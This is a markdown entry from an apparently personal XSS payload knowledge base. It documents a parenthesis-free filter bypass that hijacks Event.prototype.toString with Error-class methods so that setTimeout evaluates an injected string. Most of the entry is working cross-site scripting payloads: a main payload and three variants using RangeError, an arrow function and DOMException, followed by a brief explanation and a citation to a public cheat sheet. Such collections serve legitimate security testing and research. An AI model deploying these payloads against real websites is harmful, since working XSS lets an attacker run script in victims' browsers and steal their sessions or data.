---
title: Event.prototype Hijacking via Error Objects (no parens)
slug: event-prototype-hijack
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/js-string, sink/restricted-chars]
inbound: []
---

# Event.prototype Hijacking via Error Objects (no parens)

## Payload

```javascript
<script>ondevicemotion=setTimeout;Event.prototype.toString=URIError.prototype.toString;Event.prototype.message='alert\x281\x29'</script>
```

## Variants

```javascript
// RangeError (onmessage via iframe)
<iframe id=target></iframe><script>target.src='xss.php?x=<img/src/onerror=onmessage=setTimeout;Event.prototype.toString=RangeError.prototype.toString;Event.prototype.name="alert\x281\x29">';target.onload=setTimeout(function(){frames[0].postMessage("", "*")},100)</script>

// Arrow function (transition events)
<img/src/style=transition:0.1s onerror="window.ontransitionstart=setTimeout;this.style.opacity=0;Event.prototype.toString=x=>'alert\x281\x29'">

// DOMException (onload)
<img/src/onerror="window.onload=setTimeout;Event.prototype.toString=DOMException.prototype.toString;Event.prototype.name='alert\x281\x29'">
```

## Context

These bypass restrictions on both parentheses and execution contexts by replacing `Event.prototype.toString` with a method from an Error subtype (URIError, RangeError, DOMException). When `setTimeout` receives a string argument (the event object coerced to string), the modified `toString` returns the eval payload. The `\x28` / `\x29` hex escapes substitute for `(` `)`. The arrow function variant assigns a lambda directly. Requires injecting into a script block or event handler where the `Event.prototype` assignment executes before the event fires. Browser support varies by event type and Error class used.

## Provenance

- Distilled from: `../../techniques/dom-xss/restricted-character-bypass.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Restricted Character Bypass](../../techniques/dom-xss/restricted-character-bypass.md)
